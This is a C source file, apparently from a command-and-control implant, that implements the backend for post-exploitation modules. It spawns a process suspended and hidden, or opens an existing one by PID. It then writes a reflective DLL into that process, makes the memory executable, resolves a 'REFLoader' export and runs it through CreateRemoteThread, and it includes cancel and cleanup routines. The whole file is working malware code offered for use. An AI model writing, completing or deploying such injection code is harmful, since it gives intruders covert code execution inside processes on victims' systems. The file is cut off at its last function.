#include "beacon_postex_backend.h"

BOOL PostExRemoteCompleted(PostExJob* job)
{
    PostExConfig snapshot;
    SIZE_T read_bytes = 0;

    if (!job || !job->process || !job->remote_config) {
        return FALSE;
    }

    ZeroMemory(&snapshot, sizeof(snapshot));
    if (!ReadProcessMemory(job->process, job->remote_config,
                           &snapshot, sizeof(snapshot), &read_bytes) ||
        read_bytes < (SIZE_T)FIELD_OFFSET(PostExConfig, pipe_name)) {
        return FALSE;
    }

    return snapshot.magic == POSTEX_CONFIG_MAGIC &&
           (snapshot.stage == POSTEX_STAGE_DONE ||
            snapshot.stage == POSTEX_STAGE_CANCELLED);
}

BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                                 CHAR* out, SIZE_T out_size)
{
    if (!exe_path || !exe_path[0] || !out || out_size == 0) return FALSE;
    if (args && args[0]) {
        return _snprintf_s(out, out_size, _TRUNCATE,
                           "\"%s\" %s", exe_path, args) > 0;
    }
    return _snprintf_s(out, out_size, _TRUNCATE,
                       "\"%s\"", exe_path) > 0;
}

VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
                      const CHAR* args)
{
    if (!config) return;
    ZeroMemory(config, sizeof(*config));
    config->magic = POSTEX_CONFIG_MAGIC;
    config->version = POSTEX_CONFIG_VERSION;
    if (pipe_name) {
        wcsncpy_s(config->pipe_name, _countof(config->pipe_name), pipe_name, _TRUNCATE);
    }
    config->output_format = POSTEX_OUTPUT_FRAME;
    if (args && args[0]) {
        strncpy_s(config->args, sizeof(config->args), args, _TRUNCATE);
    }
}

VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
{
    DWORD wait_rc;
    DWORD exit_code = 0;

    if (!out || out_size == 0) return;
    out[0] = '\0';
    if (!thread) {
        strcpy_s(out, out_size, "remote_thread=null");
        return;
    }

    wait_rc = WaitForSingleObject(thread, 0);
    if (wait_rc == WAIT_TIMEOUT) {
        strcpy_s(out, out_size, "remote_thread=running");
        return;
    }
    if (wait_rc == WAIT_OBJECT_0) {
        if (GetExitCodeThread(thread, &exit_code)) {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:0x%08lx",
                        (unsigned long)exit_code);
        } else {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:GetExitCodeThread failed:%lu",
                        (unsigned long)GetLastError());
        }
        return;
    }

    _snprintf_s(out, out_size, _TRUNCATE,
                "remote_thread=wait_failed:%lu",
                (unsigned long)GetLastError());
}

VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
                                    CHAR* out, SIZE_T out_size)
{
    PostExConfig snapshot;
    SIZE_T read_bytes = 0;

    if (!out || out_size == 0) return;
    out[0] = '\0';

    if (!process || !remote_config) {
        strcpy_s(out, out_size, "remote_config=null");
        return;
    }

    ZeroMemory(&snapshot, sizeof(snapshot));
    if (!ReadProcessMemory(process, remote_config, &snapshot, sizeof(snapshot), &read_bytes) ||
        read_bytes < (SIZE_T)FIELD_OFFSET(PostExConfig, pipe_name)) {
        _snprintf_s(out, out_size, _TRUNCATE,
                    "remote_config=read_failed:%lu",
                    (unsigned long)GetLastError());
        return;
    }

    if (snapshot.magic != POSTEX_CONFIG_MAGIC) {
        _snprintf_s(out, out_size, _TRUNCATE,
                    "remote_config=bad_magic:0x%08lx",
                    (unsigned long)snapshot.magic);
        return;
    }

    _snprintf_s(out, out_size, _TRUNCATE,
                "remote_stage=%lu remote_error=%lu control=0x%08lx cancel_reason=%lu",
                (unsigned long)snapshot.stage,
                (unsigned long)snapshot.last_error,
                (unsigned long)snapshot.control_flags,
                (unsigned long)snapshot.cancel_reason);
}

static BOOL PostExRvaToRaw(PIMAGE_NT_HEADERS nt, PIMAGE_SECTION_HEADER sections,
                           DWORD rva, SIZE_T image_size, DWORD* raw)
{
    WORD i;

    if (!nt || !sections || !raw) return FALSE;
    if (rva < nt->OptionalHeader.SizeOfHeaders && rva < image_size) {
        *raw = rva;
        return TRUE;
    }

    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD va = sections[i].VirtualAddress;
        DWORD size = sections[i].Misc.VirtualSize > sections[i].SizeOfRawData ?
                     sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
        if (size == 0) continue;
        if (rva >= va && rva < va + size) {
            DWORD off = sections[i].PointerToRawData + (rva - va);
            if (off < image_size) {
                *raw = off;
                return TRUE;
            }
            return FALSE;
        }
    }
    return FALSE;
}

static const CHAR* PostExMachineName(WORD machine)
{
    if (machine == IMAGE_FILE_MACHINE_AMD64) return "x64";
    if (machine == IMAGE_FILE_MACHINE_I386) return "x86";
    return "unknown";
}

static WORD PostExBeaconMachine(VOID)
{
#if defined(_M_X64) || defined(_M_AMD64)
    return IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_IX86)
    return IMAGE_FILE_MACHINE_I386;
#else
    return 0;
#endif
}

static BOOL PostExGetDllMachine(const ByteBuf* dll,
                                WORD* machine,
                                CHAR* err,
                                SIZE_T err_size)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;

    if (machine) *machine = 0;
    if (!dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) || !machine) {
        if (err) strcpy_s(err, err_size, "invalid postex dll image");
        return FALSE;
    }

    dos = (PIMAGE_DOS_HEADER)dll->data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew <= 0 ||
        (SIZE_T)dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) > dll->len) {
        if (err) strcpy_s(err, err_size, "invalid postex dll PE header");
        return FALSE;
    }

    nt = (PIMAGE_NT_HEADERS)(dll->data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        if (err) strcpy_s(err, err_size, "invalid postex dll NT header");
        return FALSE;
    }

    *machine = nt->FileHeader.Machine;
    if (*machine != IMAGE_FILE_MACHINE_AMD64 &&
        *machine != IMAGE_FILE_MACHINE_I386) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "unsupported postex dll machine: 0x%04x",
                             (unsigned int)*machine);
        return FALSE;
    }

    return TRUE;
}

static BOOL PostExValidateDllMachineForBeacon(const ByteBuf* dll,
                                              WORD* dll_machine,
                                              CHAR* err,
                                              SIZE_T err_size)
{
    WORD machine = 0;
    WORD beacon_machine = PostExBeaconMachine();

    if (!PostExGetDllMachine(dll, &machine, err, err_size)) {
        return FALSE;
    }

    if (dll_machine) *dll_machine = machine;
    if (!beacon_machine || machine != beacon_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex arch mismatch: beacon=%s dll=%s",
                             PostExMachineName(beacon_machine),
                             PostExMachineName(machine));
        return FALSE;
    }

    return TRUE;
}

static BOOL PostExGetProcessMachine(HANDLE process,
                                    WORD* machine,
                                    CHAR* err,
                                    SIZE_T err_size)
{
    SYSTEM_INFO native_info;
    BOOL is_wow64 = FALSE;

    if (machine) *machine = 0;
    if (!process || !machine) {
        if (err) strcpy_s(err, err_size, "invalid postex target process");
        return FALSE;
    }

    ZeroMemory(&native_info, sizeof(native_info));
    GetNativeSystemInfo(&native_info);
    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        *machine = IMAGE_FILE_MACHINE_I386;
        return TRUE;
    }

    if (!IsWow64Process(process, &is_wow64)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex target arch query failed: %lu",
                             (unsigned long)GetLastError());
        return FALSE;
    }

    if (is_wow64) {
        *machine = IMAGE_FILE_MACHINE_I386;
        return TRUE;
    }
    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        *machine = IMAGE_FILE_MACHINE_AMD64;
        return TRUE;
    }

    if (err) _snprintf_s(err, err_size, _TRUNCATE,
                         "unsupported postex target architecture: %u",
                         (unsigned int)native_info.wProcessorArchitecture);
    return FALSE;
}

static BOOL PostExValidateTargetMachine(HANDLE process,
                                        WORD dll_machine,
                                        CHAR* err,
                                        SIZE_T err_size)
{
    WORD target_machine = 0;

    if (!PostExGetProcessMachine(process, &target_machine, err, err_size)) {
        return FALSE;
    }
    if (target_machine != dll_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex arch mismatch: dll=%s target=%s",
                             PostExMachineName(dll_machine),
                             PostExMachineName(target_machine));
        return FALSE;
    }

    return TRUE;
}

static BOOL PostExFindExportRawOffset(const BYTE8* image, SIZE_T image_size,
                                      const CHAR* export_name, DWORD* raw_offset)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sections;
    IMAGE_DATA_DIRECTORY* dir;
    PIMAGE_EXPORT_DIRECTORY exports;
    DWORD export_raw;
    DWORD names_raw;
    DWORD ordinals_raw;
    DWORD functions_raw;
    DWORD* names;
    WORD* ordinals;
    DWORD* functions;
    DWORD i;

    if (!image || image_size < sizeof(IMAGE_DOS_HEADER) || !export_name || !raw_offset) {
        return FALSE;
    }

    dos = (PIMAGE_DOS_HEADER)image;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew <= 0 ||
        (SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > image_size) {
        return FALSE;
    }

    nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

#if defined(_M_X64) || defined(_M_AMD64)
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;
#elif defined(_M_IX86)
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) return FALSE;
#endif

    if (nt->FileHeader.NumberOfSections == 0 ||
        (SIZE_T)dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
        nt->FileHeader.SizeOfOptionalHeader +
        ((SIZE_T)nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)) > image_size) {
        return FALSE;
    }

    sections = IMAGE_FIRST_SECTION(nt);
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress || !dir->Size) return FALSE;

    if (!PostExRvaToRaw(nt, sections, dir->VirtualAddress, image_size, &export_raw) ||
        export_raw + sizeof(IMAGE_EXPORT_DIRECTORY) > image_size) {
        return FALSE;
    }

    exports = (PIMAGE_EXPORT_DIRECTORY)(image + export_raw);
    if (!exports->NumberOfNames || !exports->AddressOfNames ||
        !exports->AddressOfNameOrdinals || !exports->AddressOfFunctions) {
        return FALSE;
    }

    if (!PostExRvaToRaw(nt, sections, exports->AddressOfNames, image_size, &names_raw) ||
        !PostExRvaToRaw(nt, sections, exports->AddressOfNameOrdinals, image_size, &ordinals_raw) ||
        !PostExRvaToRaw(nt, sections, exports->AddressOfFunctions, image_size, &functions_raw)) {
        return FALSE;
    }

    if (names_raw + exports->NumberOfNames * sizeof(DWORD) > image_size ||
        ordinals_raw + exports->NumberOfNames * sizeof(WORD) > image_size ||
        functions_raw + exports->NumberOfFunctions * sizeof(DWORD) > image_size) {
        return FALSE;
    }

    names = (DWORD*)(image + names_raw);
    ordinals = (WORD*)(image + ordinals_raw);
    functions = (DWORD*)(image + functions_raw);

    for (i = 0; i < exports->NumberOfNames; ++i) {
        DWORD name_raw;
        WORD ord;
        DWORD func_rva;

        if (!PostExRvaToRaw(nt, sections, names[i], image_size, &name_raw) ||
            name_raw >= image_size) {
            continue;
        }
        if (strcmp((const CHAR*)(image + name_raw), export_name) != 0) {
            continue;
        }

        ord = ordinals[i];
        if (ord >= exports->NumberOfFunctions) return FALSE;
        func_rva = functions[ord];
        if (!PostExRvaToRaw(nt, sections, func_rva, image_size, raw_offset)) {
            return FALSE;
        }
        return *raw_offset < image_size;
    }

    return FALSE;
}

BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
                                   const PostExConfig* config,
                                   PVOID* remote_image,
                                   SIZE_T* remote_image_size,
                                   PVOID* remote_config,
                                   PVOID* remote_entry,
                                   CHAR* err, SIZE_T err_size)
{
    DWORD loader_raw = 0;
    PBYTE image = NULL;
    PVOID cfg = NULL;
    SIZE_T wrote = 0;
    DWORD old_protect = 0;

    if (remote_image) *remote_image = NULL;
    if (remote_image_size) *remote_image_size = 0;
    if (remote_config) *remote_config = NULL;
    if (remote_entry) *remote_entry = NULL;
    if (err && err_size) err[0] = '\0';

    if (!process || !dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) ||
        !config || !remote_image || !remote_config || !remote_entry) {
        if (err) strcpy_s(err, err_size, "invalid remote reflective request");
        return FALSE;
    }
    if (!PostExFindExportRawOffset(dll->data, dll->len, "REFLoader", &loader_raw)) {
        if (err) strcpy_s(err, err_size, "reflective DLL missing REFLoader export");
        return FALSE;
    }

    image = (PBYTE)VirtualAllocEx(process, NULL, dll->len,
                                  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "VirtualAllocEx(image) failed: %lu",
                             (unsigned long)GetLastError());
        return FALSE;
    }
    if (!WriteProcessMemory(process, image, dll->data, dll->len, &wrote) ||
        wrote != dll->len) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "WriteProcessMemory(image) failed: %lu",
                             (unsigned long)GetLastError());
        VirtualFreeEx(process, image, 0, MEM_RELEASE);
        return FALSE;
    }
    if (!VirtualProtectEx(process, image, dll->len, PAGE_EXECUTE_READWRITE, &old_protect)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "VirtualProtectEx(image) failed: %lu",
                             (unsigned long)GetLastError());
        VirtualFreeEx(process, image, 0, MEM_RELEASE);
        return FALSE;
    }
    FlushInstructionCache(process, image, dll->len);

    cfg = VirtualAllocEx(process, NULL, sizeof(*config),
                         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!cfg) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "VirtualAllocEx(config) failed: %lu",
                             (unsigned long)GetLastError());
        VirtualFreeEx(process, image, 0, MEM_RELEASE);
        return FALSE;
    }
    if (!WriteProcessMemory(process, cfg, config, sizeof(*config), &wrote) ||
        wrote != sizeof(*config)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "WriteProcessMemory(config) failed: %lu",
                             (unsigned long)GetLastError());
        VirtualFreeEx(process, cfg, 0, MEM_RELEASE);
        VirtualFreeEx(process, image, 0, MEM_RELEASE);
        return FALSE;
    }

    *remote_image = image;
    if (remote_image_size) *remote_image_size = dll->len;
    *remote_config = cfg;
    *remote_entry = image + loader_raw;
    return TRUE;
}

static BOOL PostExRemoteProcessAlive(HANDLE process,
                                     CHAR* status,
                                     SIZE_T status_size)
{
    DWORD wait_rc;
    DWORD exit_code = 0;

    if (status && status_size) {
        status[0] = '\0';
    }
    if (!process) {
        if (status) strcpy_s(status, status_size, "process=null");
        return FALSE;
    }

    wait_rc = WaitForSingleObject(process, 0);
    if (wait_rc == WAIT_TIMEOUT) {
        if (status) strcpy_s(status, status_size, "process=running");
        return TRUE;
    }
    if (wait_rc == WAIT_OBJECT_0) {
        if (GetExitCodeProcess(process, &exit_code)) {
            if (status) _snprintf_s(status, status_size, _TRUNCATE,
                                    "process=exited:0x%08lx",
                                    (unsigned long)exit_code);
        } else if (status) {
            _snprintf_s(status, status_size, _TRUNCATE,
                        "process=exited:GetExitCodeProcess failed:%lu",
                        (unsigned long)GetLastError());
        }
        return FALSE;
    }

    if (status) _snprintf_s(status, status_size, _TRUNCATE,
                            "process=wait_failed:%lu",
                            (unsigned long)GetLastError());
    return FALSE;
}

BOOL PostExCreateRemoteReflectiveThread(HANDLE process,
                                        PVOID remote_entry,
                                        PVOID remote_config,
                                        HANDLE* remote_thread,
                                        CHAR* err, SIZE_T err_size)
{
    HANDLE thread = NULL;
    DWORD last_error = 0;
    INT attempt;

    if (remote_thread) *remote_thread = NULL;
    if (err && err_size) err[0] = '\0';

    if (!process || !remote_entry || !remote_config || !remote_thread) {
        if (err) strcpy_s(err, err_size, "invalid remote reflective entry");
        return FALSE;
    }

    for (attempt = 0; attempt < 5; ++attempt) {
        CHAR process_status[96];

        if (!PostExRemoteProcessAlive(process, process_status,
                                      sizeof(process_status))) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "CreateRemoteThread skipped: %s",
                                 process_status);
            return FALSE;
        }

        thread = CreateRemoteThread(process, NULL, 0,
                                    (LPTHREAD_START_ROUTINE)remote_entry,
                                    remote_config, 0, NULL);
        if (thread) {
            *remote_thread = thread;
            return TRUE;
        }

        last_error = GetLastError();
        if (last_error != ERROR_ACCESS_DENIED) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "CreateRemoteThread failed: %lu (%s)",
                                 (unsigned long)last_error,
                                 process_status);
            return FALSE;
        }
        Sleep(150);
    }

    if (!thread) {
        CHAR process_status[96];
        PostExRemoteProcessAlive(process, process_status, sizeof(process_status));
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "CreateRemoteThread failed: %lu (%s)",
                             (unsigned long)last_error,
                             process_status);
        return FALSE;
    }

    return FALSE;
}

BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
                                 const PostExConfig* config,
                                 PVOID* remote_image,
                                 SIZE_T* remote_image_size,
                                 PVOID* remote_config,
                                 HANDLE* remote_thread,
                                 CHAR* err, SIZE_T err_size)
{
    PVOID remote_entry = NULL;

    if (!PostExPrepareRemoteReflective(process, dll, config,
                                       remote_image, remote_image_size,
                                       remote_config, &remote_entry,
                                       err, err_size)) {
        return FALSE;
    }

    if (!PostExCreateRemoteReflectiveThread(process, remote_entry, *remote_config,
                                            remote_thread, err, err_size)) {
        VirtualFreeEx(process, *remote_config, 0, MEM_RELEASE);
        VirtualFreeEx(process, *remote_image, 0, MEM_RELEASE);
        *remote_config = NULL;
        *remote_image = NULL;
        if (remote_image_size) *remote_image_size = 0;
        return FALSE;
    }

    return TRUE;
}

BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
                            HANDLE* process,
                            HANDLE* remote_thread,
                            PVOID* remote_image,
                            PVOID* remote_config,
                            DWORD* pid,
                            CHAR* err,
                            SIZE_T err_size)
{
    CHAR command_line[POSTEX_CMDLINE_MAX];
    WCHAR* command_line_w = NULL;
    WCHAR* pipe_name_w = NULL;
    PostExConfig config;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    PVOID remote_entry = NULL;
    SIZE_T remote_image_size = 0;
    WORD dll_machine = 0;

    if (process) *process = NULL;
    if (remote_thread) *remote_thread = NULL;
    if (remote_image) *remote_image = NULL;
    if (remote_config) *remote_config = NULL;
    if (pid) *pid = 0;
    if (err && err_size) err[0] = '\0';

    if (!req || !process || !remote_thread || !remote_image || !remote_config || !pid) {
        if (err) strcpy_s(err, err_size, "invalid postex spawn request");
        return FALSE;
    }
    if (!PostExValidateDllMachineForBeacon(&req->dll, &dll_machine,
                                           err, err_size)) {
        return FALSE;
    }
    if (!PostExBuildSpawnCommandLine(req->spawn_path, req->spawn_args,
                                     command_line, sizeof(command_line))) {
        if (err) strcpy_s(err, err_size, "postex spawn command line too long");
        return FALSE;
    }

    command_line_w = Utf8ToWide(command_line);
    pipe_name_w = Utf8ToWide(req->pipe_name);
    if (!command_line_w || !pipe_name_w) {
        if (err) strcpy_s(err, err_size, "postex spawn string conversion failed");
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    PostExFillConfig(&config, pipe_name_w, req->module_args);
    config.flags |= POSTEX_CONFIG_FLAG_REMOTE;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!CreateProcessW(NULL, command_line_w, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex spawn CreateProcess failed: %lu",
                             (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }
    if (!PostExValidateTargetMachine(pi.hProcess, dll_machine, err, err_size)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    if (!PostExPrepareRemoteReflective(pi.hProcess, &req->dll, &config,
                                       remote_image, &remote_image_size,
                                       remote_config, &remote_entry,
                                       err, err_size)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    ResumeThread(pi.hThread);
    WaitForInputIdle(pi.hProcess, 1000);
    CloseHandle(pi.hThread);
    pi.hThread = NULL;

    if (!PostExCreateRemoteReflectiveThread(pi.hProcess, remote_entry, *remote_config,
                                            remote_thread, err, err_size)) {
        VirtualFreeEx(pi.hProcess, *remote_config, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, *remote_image, 0, MEM_RELEASE);
        *remote_config = NULL;
        *remote_image = NULL;
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, command_line_w);
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    *process = pi.hProcess;
    *pid = pi.dwProcessId;
    HeapFree(GetProcessHeap(), 0, command_line_w);
    HeapFree(GetProcessHeap(), 0, pipe_name_w);
    return TRUE;
}

BOOL PostExStartInjectRemote(const PostExStartRequest* req,
                             HANDLE* process,
                             HANDLE* remote_thread,
                             PVOID* remote_image,
                             PVOID* remote_config,
                             CHAR* err,
                             SIZE_T err_size)
{
    WCHAR* pipe_name_w = NULL;
    PostExConfig config;
    SIZE_T remote_image_size = 0;
    WORD dll_machine = 0;

    if (process) *process = NULL;
    if (remote_thread) *remote_thread = NULL;
    if (remote_image) *remote_image = NULL;
    if (remote_config) *remote_config = NULL;
    if (err && err_size) err[0] = '\0';

    if (!req || !process || !remote_thread || !remote_image || !remote_config) {
        if (err) strcpy_s(err, err_size, "invalid postex inject request");
        return FALSE;
    }
    if (!PostExValidateDllMachineForBeacon(&req->dll, &dll_machine,
                                           err, err_size)) {
        return FALSE;
    }

    pipe_name_w = Utf8ToWide(req->pipe_name);
    if (!pipe_name_w) {
        if (err) strcpy_s(err, err_size, "postex pipe name conversion failed");
        return FALSE;
    }

    PostExFillConfig(&config, pipe_name_w, req->module_args);
    config.flags |= POSTEX_CONFIG_FLAG_REMOTE;

    *process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                           PROCESS_VM_READ | SYNCHRONIZE,
                           FALSE, req->target_pid);
    if (!*process) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "postex OpenProcess failed: %lu",
                             (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }
    if (!PostExValidateTargetMachine(*process, dll_machine, err, err_size)) {
        CloseHandle(*process);
        *process = NULL;
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    if (!PostExStartRemoteReflective(*process, &req->dll, &config,
                                     remote_image, &remote_image_size,
                                     remote_config, remote_thread,
                                     err, err_size)) {
        CloseHandle(*process);
        *process = NULL;
        HeapFree(GetProcessHeap(), 0, pipe_name_w);
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pipe_name_w);
    return TRUE;
}

static VOID PostExRemoteThreadCleanupJob(PostExJob* job, BOOL kill_process)
{
    BOOL terminate_owned_process;
    BOOL release_remote_memory;

    if (!job) return;

    if (job->remote_thread) {
        WaitForSingleObject(job->remote_thread, 1000);
        CloseHandle(job->remote_thread);
        job->remote_thread = NULL;
    }
    if (!job->process) {
        return;
    }

    terminate_owned_process = kill_process && job->owns_process &&
                              WaitForSingleObject(job->process, 0) != WAIT_OBJECT_0;
    release_remote_memory = !terminate_owned_process &&
                            PostExRemoteCompleted(job);

    if (release_remote_memory) {
        if (job->remote_image) {
            VirtualFreeEx(job->process, job->remote_image, 0, MEM_RELEASE);
            job->remote_image = NULL;
        }
        if (job->remote_config) {
            VirtualFreeEx(job->process, job->remote_config, 0, MEM_RELEASE);
            job->remote_config = NULL;
        }
    }

    if (terminate_owned_process) {
        TerminateProcess(job->process, 1);
    }
    CloseHandle(job->process);
    job->process = NULL;
}

static VOID PostExRemoteThreadCleanupStartResult(const PostExStartRequest* req,
                                                 PostExStartResult* result)
{
    if (!result) return;

    if (result->remote_thread) {
        CloseHandle(result->remote_thread);
        result->remote_thread = NULL;
    }
    if (result->process) {
        if (result->remote_config) {
            VirtualFreeEx(result->process, result->remote_config, 0, MEM_RELEASE);
            result->remote_config = NULL;
        }
        if (result->remote_image) {
            VirtualFreeEx(result->process, result->remote_image, 0, MEM_RELEASE);
            result->remote_image = NULL;
        }
        if (req && result->owns_process &&
            WaitForSingleObject(result->process, 0) != WAIT_OBJECT_0) {
            TerminateProcess(result->process, 1);
        }
        CloseHandle(result->process);
        result->process = NULL;
    }
    PostExStartResultInit(result);
}

static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
{
    DWORD flags = 0;
    DWORD cancel_reason;
    SIZE_T done = 0;
    PBYTE base;

    if (!job || !job->process || !job->remote_config) {
        return FALSE;
    }

    base = (PBYTE)job->remote_config;
    cancel_reason = reason ? reason : POSTEX_CANCEL_REASON_USER;

    ReadProcessMemory(job->process,
                      base + FIELD_OFFSET(PostExConfig, control_flags),
                      &flags, sizeof(flags), &done);
    flags |= POSTEX_CONFIG_CONTROL_CANCEL;

    done = 0;
    if (!WriteProcessMemory(job->process,
                            base + FIELD_OFFSET(PostExConfig, cancel_reason),
                            &cancel_reason, sizeof(cancel_reason), &done) ||
        done != sizeof(cancel_reason)) {
        return FALSE;
    }

    done = 0;
    if (!WriteProcessMemory(job->process,
                            base + FIELD_OFFSET(PostExConfig, control_flags),
                            &flags, sizeof(flags), &done) ||
        done != sizeof(flags)) {
        return FALSE;
    }

    return TRUE;
}

VOID PostExStartResultInit(PostExStartResult* result)
{
    if (result) {
        ZeroMemory(result, sizeof(*result));
    }
}

static BOOL PostExRemoteThreadStart(const PostExStartRequest* req,
                                    PostExStartResult* result,
                                    CHAR* err,
                                    SIZE_T err_size)
{
    result->owns_process = req->owns_process;
    result->pid = req->target_pid;
    result->backend_kind = POSTEX_BACKEND_REMOTE_THREAD;

    if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL) {
        return PostExStartSpawnRemote(req,
                                      &result->process,
                                      &result->remote_thread,
                                      &result->remote_image,
                                      &result->remote_config,
                                      &result->pid,
                                      err,
                                      err_size);
    }

    if (req->subcmd == POSTEX_SUBCMD_INJECT_DLL) {
        return PostExStartInjectRemote(req,
                                       &result->process,
                                       &result->remote_thread,
                                       &result->remote_image,
                                       &result->remote_config,
                                       err,
                                       err_size);
    }

    if (err) strcpy_s(err, err_size, "remote-thread backend unsupported postex subcommand");
    PostExStartResultInit(result);
    return FALSE;
}

static const PostExBackendOps g_postex_backends[] = {
    {
        POSTEX_BACKEND_REMOTE_THREAD,
        "remote-thread",
        POSTEX_BACKEND_CAP_SPAWN_DLL | POSTEX_BACKEND_CAP_INJECT_DLL,
        PostExRemoteThreadStart,
        PostExRemoteThreadCleanupStartResult,
        PostExRemoteThreadCleanupJob,
        PostExRemoteThreadCancelJob
    }
};

const PostExBackendOps* PostExBackendFind(UINT32 kind)
{
    SIZE_T i;

    if (kind == 0) {
        kind = POSTEX_BACKEND_REMOTE_THREAD;
    }
    for (i = 0; i < _countof(g_postex_backends); ++i) {
        if (g_postex_backends[i].kind == kind) {
            return &g_postex_backends[i];
        }
    }
    return NULL;
}

VOID PostExBackendCleanupStartResult(const PostExStartRequest* req,
                                     PostExStartResult* result)
{
    const PostExBackendOps* backend;

    if (!result) return;
    backend = PostExBackendFind(result->backend_kind);
    if (backend && backend->CleanupStartResult) {
        backend->CleanupStartResult(req, result);
        return;
    }
    PostExStartResultInit(result);
}

VOID PostExBackendCleanupJob(PostExJob* job, BOOL kill_process)
{
    const PostExBackendOps* backend;

    if (!job) return;
    backend = PostExBackendFind(job->backend_kind);
    if (backend && backend->CleanupJob) {
        backend->CleanupJob(job, kill_process);
    }
}

BOOL PostExBackendCancelJob(PostExJob* job, UINT32 reason)
{
    const PostExBackendOps* backend;

    if (!job) return FALSE;
    backend = PostExBackendFind(job->backend_kind);
    if (backend && backend->CancelJob) {
        return backend->CancelJob(job, reason);
    }
    return FALSE;
}

BOOL PostExStartRemote(const PostExStartRequest* req,
                       PostExStartResult* result,
                       CHAR* err,
                       SIZE_T err_size)
{
    const PostExBackendOps* backend;
    UINT32 backend_kind;

    if (err && err_size) err[0] = '\0';
    PostExStartResultInit(result);

    if (!req || !result) {
        if (err) strcpy_s(err, err_size, "invalid postex backend request");
        return FALSE;
    }

    backend_kind = req->backend_kind ? req->backend_kind :
                   POSTEX_BACKEND_REMOTE_THREAD;
    backend = PostExBackendFind(backend_kind);
    if (!backend || !backend->Start) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "unknown postex backend: %lu",
                             (unsigned long)backend_kind);
        return FALSE;
    }

    return backend->Start(req, result, err, err_size);
